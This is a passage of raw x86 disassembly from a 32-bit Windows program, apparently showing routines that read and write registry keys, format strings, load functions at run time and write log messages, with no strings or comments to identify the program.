  40dd4b:	lea    eax,[ebp-0xc66]
  40dd51:	push   eax
  40dd52:	call   0x412060
  40dd57:	add    esp,0xc
  40dd5a:	lea    eax,[ebp-0xc68]
  40dd60:	push   0x104
  40dd65:	push   eax
  40dd66:	push   0xd2
  40dd6b:	push   edi
  40dd6c:	call   DWORD PTR ds:0x414188
  40dd72:	push   esi
  40dd73:	push   0x104
  40dd78:	lea    eax,[ebp-0x218]
  40dd7e:	push   eax
  40dd7f:	push   0x401068
  40dd84:	push   0x402870
  40dd89:	push   0x4010d8
  40dd8e:	call   DWORD PTR ds:0x414114
  40dd94:	test   eax,eax
  40dd96:	jne    0x40dda2
  40dd98:	mov    eax,0x80004005
  40dd9d:	jmp    0x40e41a
  40dda2:	mov    ecx,esi
  40dda4:	call   0x4081b2
  40dda9:	test   eax,eax
  40ddab:	js     0x40e40a
  40ddb1:	jne    0x40dde8
  40ddb3:	push   0x900
  40ddb8:	push   ecx
  40ddb9:	push   ecx
  40ddba:	mov    edi,0x105
  40ddbf:	lea    ecx,[ebp-0xe78]
  40ddc5:	push   0x4041c8
  40ddca:	mov    edx,edi
  40ddcc:	call   0x410ebe
  40ddd1:	and    DWORD PTR [ebp-0x15f4],ebx
  40ddd7:	mov    esi,0x80000001
  40dddc:	mov    DWORD PTR [ebp-0x1608],0x10
  40dde6:	jmp    0x40de44
  40dde8:	call   0x40916c
  40dded:	test   eax,eax
  40ddef:	jne    0x40de08
  40ddf1:	push   0x4041e8
  40ddf6:	push   DWORD PTR ds:0x4130e8
  40ddfc:	call   0x40e818
  40de01:	pop    ecx
  40de02:	pop    ecx
  40de03:	jmp    0x40e40a
  40de08:	push   0x900
  40de0d:	push   ecx
  40de0e:	push   ecx
  40de0f:	mov    edi,0x105
  40de14:	lea    ecx,[ebp-0xe78]
  40de1a:	push   0x403858
  40de1f:	mov    edx,edi
  40de21:	call   0x410ebe
  40de26:	xor    eax,eax
  40de28:	mov    DWORD PTR [ebp-0x1608],0x19
  40de32:	inc    eax
  40de33:	mov    esi,0x80000002
  40de38:	mov    DWORD PTR [ebp-0x15fc],eax
  40de3e:	mov    DWORD PTR [ebp-0x15f4],eax
  40de44:	push   DWORD PTR [ebp-0x15f8]
  40de4a:	lea    eax,[ebp-0x638]
  40de50:	push   0x104
  40de55:	push   eax
  40de56:	push   0x401068
  40de5b:	push   0x402888
  40de60:	push   0x4010d8
  40de65:	call   DWORD PTR ds:0x414114
  40de6b:	xor    eax,eax
  40de6d:	cmp    ax,WORD PTR [ebp-0x638]
  40de74:	je     0x40e40a
  40de7a:	lea    eax,[ebp-0x638]
  40de80:	push   eax
  40de81:	push   0x404240
  40de86:	push   0x900
  40de8b:	push   0x0
  40de8d:	push   0x0
  40de8f:	lea    eax,[ebp-0xa58]
  40de95:	push   edi
  40de96:	push   eax
  40de97:	call   0x410f98
  40de9c:	add    esp,0x1c
  40de9f:	lea    eax,[ebp-0x1610]
  40dea5:	xor    ecx,ecx
  40dea7:	mov    DWORD PTR [ebp-0x1610],ecx
  40dead:	push   eax
  40deae:	lea    eax,[ebp-0x15f0]
  40deb4:	push   eax
  40deb5:	mov    eax,DWORD PTR [ebp-0x15fc]
  40debb:	neg    eax
  40debd:	push   ecx
  40debe:	sbb    eax,eax
  40dec0:	and    eax,0xfffffffa
  40dec3:	add    eax,0x2001f
  40dec8:	push   eax
  40dec9:	push   ecx
  40deca:	push   ecx
  40decb:	push   ecx
  40decc:	lea    eax,[ebp-0xa58]
  40ded2:	push   eax
  40ded3:	push   esi
  40ded4:	call   DWORD PTR ds:0x414020
  40deda:	test   eax,eax
  40dedc:	jne    0x40e40a
  40dee2:	lea    eax,[ebp-0x1600]
  40dee8:	push   eax
  40dee9:	push   0x20019
  40deee:	push   0x0
  40def0:	push   0x401588
  40def5:	push   esi
  40def6:	call   DWORD PTR ds:0x414004
  40defc:	test   eax,eax
  40defe:	jne    0x40e3fe
  40df04:	lea    eax,[ebp-0x1604]
  40df0a:	mov    DWORD PTR [ebp-0x1604],0x208
  40df14:	push   eax
  40df15:	lea    eax,[ebp-0x1088]
  40df1b:	push   eax
  40df1c:	push   0x0
  40df1e:	push   0x0
  40df20:	lea    eax,[ebp-0x218]
  40df26:	push   eax
  40df27:	push   DWORD PTR [ebp-0x1600]
  40df2d:	call   DWORD PTR ds:0x414000
  40df33:	test   eax,eax
  40df35:	jne    0x40e3f2
  40df3b:	mov    eax,DWORD PTR [ebp-0x1604]
  40df41:	and    eax,0xfffffffe
  40df44:	cmp    eax,0x20a
  40df49:	jae    0x40e42d
  40df4f:	xor    ecx,ecx
  40df51:	lea    edx,[ebp-0x428]
  40df57:	mov    WORD PTR [ebp+eax*1-0x1088],cx
  40df5f:	push   ecx
  40df60:	lea    ecx,[ebp-0x1088]
  40df66:	call   0x40dbfa
  40df6b:	push   DWORD PTR [ebp-0x1600]
  40df71:	call   DWORD PTR ds:0x414008
  40df77:	mov    ecx,DWORD PTR [ebp-0x15fc]
  40df7d:	test   ecx,ecx
  40df7f:	je     0x40dfb2
  40df81:	mov    eax,ds:0x4136c0
  40df86:	lea    edx,[ebp-0x428]
  40df8c:	push   edx
  40df8d:	push   0x4042b0
  40df92:	lea    edx,[ebp-0xa58]
  40df98:	mov    esi,DWORD PTR [eax]
  40df9a:	push   edx
  40df9b:	push   ecx
  40df9c:	push   eax
  40df9d:	mov    ecx,DWORD PTR [esi+0x28]
  40dfa0:	call   DWORD PTR ds:0x414220
  40dfa6:	call   DWORD PTR [esi+0x28]
  40dfa9:	test   eax,eax
  40dfab:	jns    0x40dff1
  40dfad:	jmp    0x40e3fe
  40dfb2:	lea    eax,[ebp-0x428]
  40dfb8:	push   eax
  40dfb9:	call   DWORD PTR ds:0x414068
  40dfbf:	lea    eax,[eax*2+0x2]
  40dfc6:	push   eax
  40dfc7:	mov    DWORD PTR [ebp-0x1604],eax
  40dfcd:	lea    eax,[ebp-0x428]
  40dfd3:	push   eax
  40dfd4:	push   0x1
  40dfd6:	push   0x0
  40dfd8:	push   0x4042b0
  40dfdd:	push   DWORD PTR [ebp-0x15f0]
  40dfe3:	call   DWORD PTR ds:0x41403c
  40dfe9:	test   eax,eax
  40dfeb:	jne    0x40e3fe
  40dff1:	lea    eax,[ebp-0x638]
  40dff7:	push   eax
  40dff8:	lea    eax,[ebp-0x428]
  40dffe:	push   eax
  40dfff:	push   0x40344c
  40e004:	push   0x900
  40e009:	push   0x0
  40e00b:	push   0x0
  40e00d:	lea    eax,[ebp-0x848]
  40e013:	push   edi
  40e014:	push   eax
  40e015:	call   0x410f98
  40e01a:	add    esp,0x20
  40e01d:	push   DWORD PTR [ebp-0x15f0]
  40e023:	call   DWORD PTR ds:0x414008
  40e029:	lea    eax,[ebp-0x638]
  40e02f:	push   eax
  40e030:	lea    eax,[ebp-0x848]
  40e036:	push   eax
  40e037:	push   0x4042cc
  40e03c:	push   0x900
  40e041:	push   0x0
  40e043:	push   0x0
  40e045:	lea    eax,[ebp-0x1298]
  40e04b:	push   edi
  40e04c:	push   eax
  40e04d:	call   0x410f98
  40e052:	add    esp,0x20
  40e055:	test   eax,eax
  40e057:	js     0x40e40a
  40e05d:	xor    eax,eax
  40e05f:	cmp    ax,WORD PTR [ebp-0x218]
  40e066:	je     0x40e143
  40e06c:	lea    ecx,[ebp-0x15e8]
  40e072:	call   0x40fa90
  40e077:	test   eax,eax
  40e079:	je     0x40e0ec
  40e07b:	lea    edx,[ebp-0x15ec]
  40e081:	lea    ecx,[ebp-0x428]
  40e087:	call   0x406e0f
  40e08c:	test   eax,eax
  40e08e:	je     0x40e0c4
  40e090:	lea    ecx,[ebp-0x15e8]
  40e096:	call   0x40fa90
  40e09b:	mov    ecx,DWORD PTR ds:0x4136c0
  40e0a1:	lea    edx,[ebp-0x218]
  40e0a7:	neg    eax
  40e0a9:	sbb    eax,eax
  40e0ab:	inc    eax
  40e0ac:	push   eax
  40e0ad:	push   DWORD PTR [ebp-0x15ec]
  40e0b3:	call   0x407202
  40e0b8:	push   DWORD PTR [ebp-0x15ec]
  40e0be:	call   DWORD PTR ds:0x4141bc
  40e0c4:	mov    esi,DWORD PTR [ebp-0x15f4]
  40e0ca:	test   esi,esi
  40e0cc:	je     0x40e0f2
  40e0ce:	push   DWORD PTR [ebp-0x160c]
  40e0d4:	xor    eax,eax
  40e0d6:	lea    ecx,[ebp-0x428]
  40e0dc:	mov    edx,edi
  40e0de:	mov    WORD PTR [ebp-0x428],ax
  40e0e5:	call   0x406b17
  40e0ea:	jmp    0x40e0f2
  40e0ec:	mov    esi,DWORD PTR [ebp-0x15f4]
  40e0f2:	mov    ecx,DWORD PTR ds:0x4136c0
  40e0f8:	lea    eax,[ebp-0x15ec]
  40e0fe:	push   esi
  40e0ff:	push   eax
  40e100:	lea    edx,[ebp-0x428]
  40e106:	call   0x4068c4
  40e10b:	test   eax,eax
  40e10d:	je     0x40e137
  40e10f:	lea    ecx,[ebp-0x15e8]
  40e115:	call   0x40fa90
  40e11a:	mov    ecx,DWORD PTR ds:0x4136c0
  40e120:	lea    edx,[ebp-0x218]
  40e126:	neg    eax
  40e128:	sbb    eax,eax
  40e12a:	inc    eax
  40e12b:	push   eax
  40e12c:	push   DWORD PTR [ebp-0x15ec]
  40e132:	call   0x407202
  40e137:	push   DWORD PTR [ebp-0x15ec]
  40e13d:	call   DWORD PTR ds:0x4141bc
  40e143:	lea    eax,[ebp-0x1298]
  40e149:	push   eax
  40e14a:	push   0x0
  40e14c:	push   0x402860
  40e151:	push   0x4028d4
  40e156:	call   DWORD PTR ds:0x414070
  40e15c:	cmp    eax,0x1
  40e15f:	jg     0x40e16c
  40e161:	mov    ecx,DWORD PTR [ebp-0x15f8]
  40e167:	call   0x406fb8
  40e16c:	mov    edx,DWORD PTR [ebp-0x15f8]
  40e172:	lea    eax,[ebp-0xc68]
  40e178:	mov    ecx,DWORD PTR ds:0x4136c0
  40e17e:	push   0x0
  40e180:	push   eax
  40e181:	lea    eax,[ebp-0xe78]
  40e187:	push   eax
  40e188:	call   0x410068
  40e18d:	xor    ebx,ebx
  40e18f:	lea    ecx,[ebp-0x15e8]
  40e195:	test   eax,eax
  40e197:	setns  bl
  40e19a:	call   0x40fa90
  40e19f:	test   eax,eax
  40e1a1:	je     0x40e1d9
  40e1a3:	mov    ecx,DWORD PTR [ebp-0x1608]
  40e1a9:	lea    edx,[ebp-0x14a8]
  40e1af:	mov    esi,DWORD PTR ds:0x4136c4
  40e1b5:	call   0x408137
  40e1ba:	test   eax,eax
  40e1bc:	js     0x40e1d9
  40e1be:	mov    edx,DWORD PTR [ebp-0x160c]
  40e1c4:	lea    eax,[ebp-0x14a8]
  40e1ca:	push   eax
  40e1cb:	lea    eax,[ebp-0x218]
  40e1d1:	mov    ecx,esi
  40e1d3:	push   eax
  40e1d4:	call   0x407604
  40e1d9:	xor    eax,eax
  40e1db:	cmp    ax,WORD PTR [ebp-0x848]
  40e1e2:	je     0x40e23b
  40e1e4:	push   0x80
  40e1e9:	lea    eax,[ebp-0x848]
  40e1ef:	push   eax
  40e1f0:	call   DWORD PTR ds:0x414090
  40e1f6:	test   eax,eax
  40e1f8:	je     0x40e23b
  40e1fa:	push   0x7
  40e1fc:	pop    ecx
  40e1fd:	xor    eax,eax
  40e1ff:	lea    edi,[ebp-0x1630]
  40e205:	rep stos DWORD PTR es:[edi],eax
  40e207:	push   0x14
  40e209:	stos   WORD PTR es:[edi],ax
  40e20b:	lea    eax,[ebp-0x848]
  40e211:	mov    DWORD PTR [ebp-0x1628],eax
  40e217:	pop    eax
  40e218:	mov    WORD PTR [ebp-0x1620],ax
  40e21f:	lea    eax,[ebp-0x1630]
  40e225:	push   eax
  40e226:	mov    DWORD PTR [ebp-0x162c],0x3
  40e230:	call   DWORD PTR ds:0x414138
  40e236:	mov    edi,0x105
  40e23b:	push   0x4042e0
  40e240:	push   DWORD PTR ds:0x4130e8
  40e246:	call   0x40e818
  40e24b:	lea    eax,[ebp-0x638]
  40e251:	push   eax
  40e252:	push   0x404364
  40e257:	push   DWORD PTR ds:0x4130e8
  40e25d:	call   0x40e818
  40e262:	add    esp,0x14
  40e265:	cmp    DWORD PTR [ebp-0x15f4],0x0
  40e26c:	je     0x40e2db
  40e26e:	lea    ecx,[ebp-0x15e8]
  40e274:	call   0x40fa90
  40e279:	test   eax,eax
  40e27b:	je     0x40e2cd
  40e27d:	mov    ecx,DWORD PTR ds:0x4136c0
  40e283:	test   ecx,ecx
  40e285:	je     0x40e2a5
  40e287:	mov    eax,DWORD PTR [ecx]
  40e289:	lea    edx,[ebp-0x638]
  40e28f:	push   edx
  40e290:	push   ecx
  40e291:	mov    esi,DWORD PTR [eax+0x44]
  40e294:	mov    ecx,esi
  40e296:	call   DWORD PTR ds:0x414220
  40e29c:	call   esi
  40e29e:	and    eax,0xffff
  40e2a3:	jmp    0x40e2b0
  40e2a5:	lea    ecx,[ebp-0x638]
  40e2ab:	call   0x408a5e
  40e2b0:	test   eax,eax
  40e2b2:	je     0x40e2bb
  40e2b4:	push   0x404390
  40e2b9:	jmp    0x40e2c0
  40e2bb:	push   0x4043d0
  40e2c0:	push   DWORD PTR ds:0x4130e8
  40e2c6:	call   0x40e818
  40e2cb:	pop    ecx
  40e2cc:	pop    ecx
  40e2cd:	lea    eax,[ebp-0x218]
  40e2d3:	push   eax
  40e2d4:	push   0x403fb8
  40e2d9:	jmp    0x40e2e7
  40e2db:	lea    eax,[ebp-0x218]
  40e2e1:	push   eax
  40e2e2:	push   0x404018
  40e2e7:	push   0x401f98
  40e2ec:	push   0x900
  40e2f1:	push   0x0
  40e2f3:	push   0x0
  40e2f5:	lea    eax,[ebp-0xa58]
  40e2fb:	push   edi
  40e2fc:	push   eax
  40e2fd:	call   0x410f98
  40e302:	xor    edi,edi
  40e304:	add    esp,0x20
  40e307:	inc    edi
  40e308:	cmp    DWORD PTR [ebp+0x8],0x0
  40e30c:	je     0x40e33b
  40e30e:	mov    esi,0x80000001
  40e313:	lea    edx,[ebp-0xa58]
  40e319:	push   edi
  40e31a:	mov    ecx,esi
  40e31c:	call   0x40d8c9
  40e321:	push   edi
  40e322:	mov    edx,0x403fb8
  40e327:	mov    ecx,esi
  40e329:	call   0x40d8c9
  40e32e:	push   edi
  40e32f:	mov    edx,0x404018
  40e334:	mov    ecx,esi
  40e336:	call   0x40d8c9
  40e33b:	mov    eax,ds:0x4136c0
  40e340:	push   0x0
  40e342:	test   eax,eax
  40e344:	je     0x40e35d
  40e346:	mov    esi,DWORD PTR [eax]
  40e348:	push   0x401588
  40e34d:	push   edi
  40e34e:	push   eax
  40e34f:	mov    ecx,DWORD PTR [esi+0x30]
  40e352:	call   DWORD PTR ds:0x414220
  40e358:	call   DWORD PTR [esi+0x30]
  40e35b:	jmp    0x40e36c
  40e35d:	mov    edx,0x401588
  40e362:	mov    ecx,0x80000002
  40e367:	call   0x40d8c9
  40e36c:	push   0x0
  40e36e:	mov    edx,0x401588
  40e373:	mov    ecx,0x80000001
  40e378:	call   0x40d8c9
  40e37d:	mov    ecx,DWORD PTR ds:0x4136c0
  40e383:	test   ecx,ecx
  40e385:	je     0x40e39f
  40e387:	mov    eax,DWORD PTR [ecx]
  40e389:	push   0x404160
  40e38e:	push   edi
  40e38f:	push   ecx
  40e390:	mov    esi,DWORD PTR [eax+0x34]
  40e393:	mov    ecx,esi
  40e395:	call   DWORD PTR ds:0x414220
  40e39b:	call   esi
  40e39d:	jmp    0x40e3ae
  40e39f:	mov    edx,0x404160
  40e3a4:	mov    ecx,0x80000002
  40e3a9:	call   0x4070ef
  40e3ae:	mov    eax,ds:0x4136c0
  40e3b3:	push   edi
  40e3b4:	mov    edi,0x4028f8
  40e3b9:	test   eax,eax
  40e3bb:	je     0x40e3d1
  40e3bd:	mov    esi,DWORD PTR [eax]
  40e3bf:	push   edi
  40e3c0:	push   0x1
  40e3c2:	push   eax
  40e3c3:	mov    ecx,DWORD PTR [esi+0x30]
  40e3c6:	call   DWORD PTR ds:0x414220
  40e3cc:	call   DWORD PTR [esi+0x30]
  40e3cf:	jmp    0x40e3dd
  40e3d1:	mov    edx,edi
  40e3d3:	mov    ecx,0x80000002
  40e3d8:	call   0x40d8c9
  40e3dd:	push   0x1
  40e3df:	mov    edx,edi
  40e3e1:	mov    ecx,0x80000001
  40e3e6:	call   0x40d8c9
  40e3eb:	call   0x408277
  40e3f0:	jmp    0x40e40a
  40e3f2:	push   DWORD PTR [ebp-0x1600]
  40e3f8:	call   DWORD PTR ds:0x414008
  40e3fe:	push   DWORD PTR [ebp-0x15f0]
  40e404:	call   DWORD PTR ds:0x414008
  40e40a:	neg    ebx
  40e40c:	sbb    ebx,ebx
  40e40e:	and    ebx,0x7fffbffb
  40e414:	lea    eax,[ebx-0x7fffbffb]
  40e41a:	mov    ecx,DWORD PTR [ebp-0x4]
  40e41d:	pop    edi
  40e41e:	pop    esi
  40e41f:	xor    ecx,ebp
  40e421:	pop    ebx
  40e422:	call   0x411980
  40e427:	mov    esp,ebp
  40e429:	pop    ebp
  40e42a:	ret    0x4
  40e42d:	call   0x411ad9
  40e432:	int3   
  40e433:	int3   
  40e434:	int3   
  40e435:	int3   
  40e436:	int3   
  40e437:	int3   
  40e438:	mov    edi,edi
  40e43a:	push   ebp
  40e43b:	mov    ebp,esp
  40e43d:	push   esi
  40e43e:	xor    esi,esi
  40e440:	test   edx,edx
  40e442:	je     0x40e44c
  40e444:	cmp    edx,0x7fffffff
  40e44a:	jbe    0x40e451
  40e44c:	mov    esi,0x80070057
  40e451:	test   esi,esi
  40e453:	js     0x40e48d
  40e455:	xor    esi,esi
  40e457:	test   edx,edx
  40e459:	je     0x40e485
  40e45b:	push   ebx
  40e45c:	mov    ebx,DWORD PTR [ebp+0x8]
  40e45f:	push   edi
  40e460:	mov    edi,0x7ffffffe
  40e465:	sub    edi,edx
  40e467:	sub    ebx,ecx
  40e469:	lea    eax,[edi+edx*1]
  40e46c:	test   eax,eax
  40e46e:	je     0x40e47f
  40e470:	mov    al,BYTE PTR [ebx+ecx*1]
  40e473:	test   al,al
  40e475:	je     0x40e47f
  40e477:	mov    BYTE PTR [ecx],al
  40e479:	inc    ecx
  40e47a:	sub    edx,0x1
  40e47d:	jne    0x40e469
  40e47f:	pop    edi
  40e480:	pop    ebx
  40e481:	test   edx,edx
  40e483:	jne    0x40e491
  40e485:	dec    ecx
  40e486:	mov    esi,0x8007007a
  40e48b:	jmp    0x40e491
  40e48d:	test   edx,edx
  40e48f:	je     0x40e494
  40e491:	mov    BYTE PTR [ecx],0x0
  40e494:	mov    eax,esi
  40e496:	pop    esi
  40e497:	pop    ebp
  40e498:	ret    0x4
  40e49b:	int3   
  40e49c:	int3   
  40e49d:	int3   
  40e49e:	int3   
  40e49f:	int3   
  40e4a0:	mov    edi,edi
  40e4a2:	push   ebp
  40e4a3:	mov    ebp,esp
  40e4a5:	push   ecx
  40e4a6:	push   esi
  40e4a7:	mov    esi,ecx
  40e4a9:	xor    eax,eax
  40e4ab:	test   esi,esi
  40e4ad:	jne    0x40e4b4
  40e4af:	mov    eax,0x80070057
  40e4b4:	test   eax,eax
  40e4b6:	js     0x40e4da
  40e4b8:	mov    eax,DWORD PTR [ebp+0x14]
  40e4bb:	test   eax,eax
  40e4bd:	jne    0x40e4c4
  40e4bf:	mov    eax,0x404414
  40e4c4:	push   DWORD PTR [ebp+0x18]
  40e4c7:	mov    edx,0x200
  40e4cc:	push   eax
  40e4cd:	lea    eax,[ebp-0x4]
  40e4d0:	push   eax
  40e4d1:	call   0x40e4e9
  40e4d6:	test   eax,eax
  40e4d8:	jns    0x40e4dd
  40e4da:	mov    BYTE PTR [esi],0x0
  40e4dd:	pop    esi
  40e4de:	mov    esp,ebp
  40e4e0:	pop    ebp
  40e4e1:	ret    0x14
  40e4e4:	int3   
  40e4e5:	int3   
  40e4e6:	int3   
  40e4e7:	int3   
  40e4e8:	int3   
  40e4e9:	mov    edi,edi
  40e4eb:	push   ebp
  40e4ec:	mov    ebp,esp
  40e4ee:	push   ebx
  40e4ef:	push   esi
  40e4f0:	push   edi
  40e4f1:	push   DWORD PTR [ebp+0x10]
  40e4f4:	lea    esi,[edx-0x1]
  40e4f7:	mov    edi,ecx
  40e4f9:	push   DWORD PTR [ebp+0xc]
  40e4fc:	xor    ebx,ebx
  40e4fe:	push   esi
  40e4ff:	push   edi
  40e500:	call   DWORD PTR ds:0x4141e4
  40e506:	add    esp,0x10
  40e509:	test   eax,eax
  40e50b:	js     0x40e51c
  40e50d:	cmp    eax,esi
  40e50f:	ja     0x40e51c
  40e511:	jne    0x40e518
  40e513:	mov    BYTE PTR [esi+edi*1],bl
  40e516:	jmp    0x40e524
  40e518:	mov    esi,eax
  40e51a:	jmp    0x40e524
  40e51c:	mov    BYTE PTR [esi+edi*1],bl
  40e51f:	mov    ebx,0x8007007a
  40e524:	mov    eax,DWORD PTR [ebp+0x8]
  40e527:	test   eax,eax
  40e529:	je     0x40e52d
  40e52b:	mov    DWORD PTR [eax],esi
  40e52d:	pop    edi
  40e52e:	pop    esi
  40e52f:	mov    eax,ebx
  40e531:	pop    ebx
  40e532:	pop    ebp
  40e533:	ret    0xc
  40e536:	int3   
  40e537:	int3   
  40e538:	int3   
  40e539:	int3   
  40e53a:	int3   
  40e53b:	mov    edi,edi
  40e53d:	push   esi
  40e53e:	xor    esi,esi
  40e540:	lock inc DWORD PTR ds:0x4138e4
  40e547:	push   0x404418
  40e54c:	call   DWORD PTR ds:0x4140e4
  40e552:	mov    ds:0x4138ec,eax
  40e557:	test   eax,eax
  40e559:	je     0x40e5d8
  40e55b:	push   0x404424
  40e560:	push   eax
  40e561:	call   DWORD PTR ds:0x414048
  40e567:	mov    ds:0x4138e0,eax
  40e56c:	test   eax,eax
  40e56e:	je     0x40e5d8
  40e570:	push   0x404438
  40e575:	push   DWORD PTR ds:0x4138ec
  40e57b:	call   DWORD PTR ds:0x414048
  40e581:	mov    ds:0x4138f0,eax
  40e586:	test   eax,eax
  40e588:	je     0x40e5d8
  40e58a:	push   0x40444c
  40e58f:	push   DWORD PTR ds:0x4138ec
  40e595:	call   DWORD PTR ds:0x414048
  40e59b:	mov    ds:0x4138d8,eax
  40e5a0:	test   eax,eax
  40e5a2:	je     0x40e5d8
  40e5a4:	push   0x40445c
  40e5a9:	push   DWORD PTR ds:0x4138ec
  40e5af:	call   DWORD PTR ds:0x414048
  40e5b5:	mov    ds:0x4138e8,eax
  40e5ba:	test   eax,eax
  40e5bc:	je     0x40e5d8
  40e5be:	push   0x40446c
  40e5c3:	push   DWORD PTR ds:0x4138ec
  40e5c9:	call   DWORD PTR ds:0x414048
  40e5cf:	mov    ds:0x4138dc,eax
  40e5d4:	test   eax,eax
  40e5d6:	jne    0x40e5e0
  40e5d8:	call   DWORD PTR ds:0x414074
  40e5de:	mov    esi,eax
  40e5e0:	lock dec DWORD PTR ds:0x4138e4
  40e5e7:	mov    eax,esi
  40e5e9:	pop    esi
  40e5ea:	ret    
  40e5eb:	int3   
  40e5ec:	int3   
  40e5ed:	int3   
  40e5ee:	int3   
  40e5ef:	int3   
  40e5f0:	mov    edi,edi
  40e5f2:	push   ebp
  40e5f3:	mov    ebp,esp
  40e5f5:	push   ecx
  40e5f6:	mov    eax,ds:0x413004
  40e5fb:	xor    eax,ebp
  40e5fd:	mov    DWORD PTR [ebp-0x4],eax
  40e600:	xor    eax,eax
  40e602:	push   esi
  40e603:	cmp    eax,0x4130e8
  40e608:	jne    0x40e60f
  40e60a:	push   0x57
  40e60c:	pop    esi
  40e60d:	jmp    0x40e664
  40e60f:	cmp    DWORD PTR ds:0x4130e8,0xffffffff
  40e616:	je     0x40e61f
  40e618:	mov    esi,0xb7
  40e61d:	jmp    0x40e664
  40e61f:	call   0x40e53b
  40e624:	mov    esi,eax
  40e626:	test   esi,esi
  40e628:	jne    0x40e664
  40e62a:	push   edi
  40e62b:	mov    edi,DWORD PTR ds:0x4138e0
  40e631:	test   edi,edi
  40e633:	je     0x40e659
  40e635:	push   eax
  40e636:	push   0x401168
  40e63b:	mov    ecx,edi
  40e63d:	call   DWORD PTR ds:0x414220
  40e643:	call   edi
  40e645:	mov    ds:0x4130e8,eax
  40e64a:	cmp    eax,0xffffffff
  40e64d:	jne    0x40e659
  40e64f:	call   DWORD PTR ds:0x414074
  40e655:	mov    esi,eax
  40e657:	jmp    0x40e663
  40e659:	mov    DWORD PTR ds:0x4138f4,0x1
  40e663:	pop    edi
  40e664:	mov    ecx,DWORD PTR [ebp-0x4]
  40e667:	mov    eax,esi
  40e669:	xor    ecx,ebp
  40e66b:	pop    esi
  40e66c:	call   0x411980
  40e671:	mov    esp,ebp
  40e673:	pop    ebp
  40e674:	ret    
  40e675:	int3   
  40e676:	int3   
  40e677:	int3   
  40e678:	int3   
  40e679:	int3   
  40e67a:	mov    edi,edi
  40e67c:	push   ebp
  40e67d:	mov    ebp,esp
  40e67f:	push   ecx
  40e680:	mov    eax,ds:0x413004
  40e685:	xor    eax,ebp
  40e687:	mov    DWORD PTR [ebp-0x4],eax
  40e68a:	xor    ecx,ecx
  40e68c:	xor    eax,eax
  40e68e:	cmp    ecx,0x4130e8
  40e694:	jne    0x40e699
  40e696:	push   0x57
  40e698:	pop    eax
  40e699:	mov    ecx,DWORD PTR ds:0x4130e8
  40e69f:	cmp    ecx,0xffffffff
  40e6a2:	je     0x40e6c3
  40e6a4:	push   esi
  40e6a5:	mov    esi,DWORD PTR ds:0x4138f0
  40e6ab:	test   esi,esi
  40e6ad:	je     0x40e6c2
  40e6af:	push   0x4
  40e6b1:	push   ecx
  40e6b2:	mov    ecx,esi
  40e6b4:	call   DWORD PTR ds:0x414220
  40e6ba:	call   esi
  40e6bc:	call   DWORD PTR ds:0x414074
  40e6c2:	pop    esi
  40e6c3:	test   eax,eax
  40e6c5:	jne    0x40e6f2
  40e6c7:	or     DWORD PTR ds:0x4130e8,0xffffffff
  40e6ce:	mov    eax,ds:0x4138ec
  40e6d3:	test   eax,eax
  40e6d5:	je     0x40e6de
  40e6d7:	push   eax
  40e6d8:	call   DWORD PTR ds:0x414120
  40e6de:	and    DWORD PTR ds:0x4138ec,0x0
  40e6e5:	call   DWORD PTR ds:0x414074
  40e6eb:	and    DWORD PTR ds:0x4138f4,0x0
  40e6f2:	mov    ecx,DWORD PTR [ebp-0x4]
  40e6f5:	xor    ecx,ebp
  40e6f7:	call   0x411980
  40e6fc:	mov    esp,ebp
  40e6fe:	pop    ebp
  40e6ff:	ret    
  40e700:	int3   
  40e701:	int3   
  40e702:	int3   
  40e703:	int3   
  40e704:	int3   
  40e705:	mov    edi,edi
  40e707:	push   ebp
  40e708:	mov    ebp,esp
  40e70a:	sub    esp,0x608
  40e710:	mov    eax,ds:0x413004
  40e715:	xor    eax,ebp
  40e717:	mov    DWORD PTR [ebp-0x4],eax
  40e71a:	push   ebx
  40e71b:	push   edi
  40e71c:	mov    ebx,edx
  40e71e:	mov    edi,0x600
  40e723:	cmp    ebx,edi
  40e725:	ja     0x40e780
  40e727:	test   ecx,ecx
  40e729:	je     0x40e780
  40e72b:	xor    eax,eax
  40e72d:	mov    BYTE PTR [ebx+ecx*1-0x1],0x0
  40e732:	lea    edx,[ebp-0x604]
  40e738:	mov    DWORD PTR [ebp-0x608],eax
  40e73e:	push   esi
  40e73f:	mov    esi,ecx
  40e741:	cmp    BYTE PTR [ecx],al
  40e743:	je     0x40e76a
  40e745:	cmp    edi,0x1
  40e748:	jbe    0x40e76a
  40e74a:	mov    al,BYTE PTR [esi]
  40e74c:	mov    BYTE PTR [edx],al
  40e74e:	inc    edx
  40e74f:	dec    edi
  40e750:	cmp    al,0x25
  40e752:	jne    0x40e75e
  40e754:	mov    BYTE PTR [edx],al
  40e756:	inc    edx
  40e757:	dec    edi
  40e758:	cmp    BYTE PTR [esi+0x1],al
  40e75b:	jne    0x40e790
  40e75d:	inc    esi
  40e75e:	mov    eax,DWORD PTR [ebp-0x608]
  40e764:	inc    esi
  40e765:	cmp    BYTE PTR [esi],0x0
  40e768:	jne    0x40e745
  40e76a:	mov    BYTE PTR [edx],0x0
  40e76d:	pop    esi
  40e76e:	test   eax,eax
  40e770:	je     0x40e780
  40e772:	lea    eax,[ebp-0x604]
  40e778:	mov    edx,ebx
  40e77a:	push   eax
  40e77b:	call   0x40e438
  40e780:	mov    ecx,DWORD PTR [ebp-0x4]
  40e783:	pop    edi
  40e784:	xor    ecx,ebp
  40e786:	pop    ebx
  40e787:	call   0x411980
  40e78c:	mov    esp,ebp
  40e78e:	pop    ebp
  40e78f:	ret    
  40e790:	xor    eax,eax
  40e792:	inc    eax
  40e793:	mov    DWORD PTR [ebp-0x608],eax
  40e799:	jmp    0x40e764
  40e79b:	int3   
  40e79c:	int3   
  40e79d:	int3   
  40e79e:	int3   
  40e79f:	int3   
  40e7a0:	mov    edi,edi
  40e7a2:	push   ebp
  40e7a3:	mov    ebp,esp
  40e7a5:	sub    esp,0x204
  40e7ab:	mov    eax,ds:0x413004
  40e7b0:	xor    eax,ebp
  40e7b2:	mov    DWORD PTR [ebp-0x4],eax
  40e7b5:	lea    eax,[ebp+0x10]
  40e7b8:	push   eax
  40e7b9:	push   DWORD PTR [ebp+0xc]
  40e7bc:	lea    ecx,[ebp-0x204]
  40e7c2:	sub    esp,0xc
  40e7c5:	call   0x40e4a0
  40e7ca:	cmp    DWORD PTR [ebp+0x8],0xffffffff
  40e7ce:	je     0x40e805
  40e7d0:	push   esi
  40e7d1:	mov    esi,DWORD PTR ds:0x4138e8
  40e7d7:	test   esi,esi
  40e7d9:	je     0x40e804
  40e7db:	mov    edx,0x200
  40e7e0:	lea    ecx,[ebp-0x204]
  40e7e6:	call   0x40e705
